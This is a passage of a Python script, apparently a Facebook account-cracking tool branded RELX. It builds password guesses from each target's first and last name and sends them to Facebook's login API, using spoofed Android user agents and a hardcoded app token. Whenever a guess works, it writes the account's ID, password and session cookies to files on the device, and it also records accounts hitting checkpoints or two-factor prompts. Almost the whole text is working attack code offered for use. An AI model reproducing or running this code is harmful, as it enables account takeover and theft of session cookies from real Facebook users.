xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#_________[ METHOD 2 - WITH COLOR CHANGING ]______>>  
def api(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m', '\033[1;91m', '\033[1;92m', '\033[1;93m', '\033[1;94m', '\033[1;95m', '\033[1;96m']
                        color = random.choice(colors)
                        sys.stdout.write(f'\r\033[1;36m [RELX-M2] \033[1;33m{loop}\033[0m')
                        sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1406};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\33[1;92m[\033[0;97mRELX-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/RELX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/RELX-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\33[1;97m[\033[1;92mRELX-2F\033[1;97m]\033[1;92m '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                   
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;91mRELX-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                open('/sdcard/RELX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ METHOD 3 - WITH COLOR CHANGING ]______>>  
def api1(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m', '\033[1;91m', '\033[1;92m', '\033[1;93m', '\033[1;94m', '\033[1;95m', '\033[1;96m']
                        color = random.choice(colors)
                        sys.stdout.write(f'\r\033[1;36m [RELX-M3] \033[1;33m{loop}\033[0m')
                        sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                                fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113'])
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1280};FBLC/'+fblc+';FBCR/'+fbcr+';FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+'.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\r\x1b[1;92m[\033[0;97mRELX-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/RELX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/RELX-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;96mRELX-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;91mRELX -CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                open('/sdcard/RELX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ METHOD RANDOM CLONING ]______>>  
def rndm(ids,passlist):
                try:
                        global ok,loop
                        colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m', '\033[1;91m', '\033[1;92m', '\033[1;93m', '\033[1;94m', '\033[1;95m', '\033[1;96m']
                        color = random.choice(colors)
                        sys.stdout.write(f'\r\033[1;36m [RELX-RND] \033[1;33m{loop}\033[0m')
                        sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
                                ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1406};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+android_version+';FBOP/1;FBCA/arm64-v8a:;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RELX-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;92m[\033[0;97mRELX -OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        open('/sdcard/RELX -rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/RELX -rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[\033[0;91mRELX-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
                                                open('/sdcard/RELX-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ NETWORK ERROR ]______>>  
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n\033[0;97m[•]\033[1;31m NO INTERNET CONNECTION...')
        exit()
except Exception as e:pass
menu()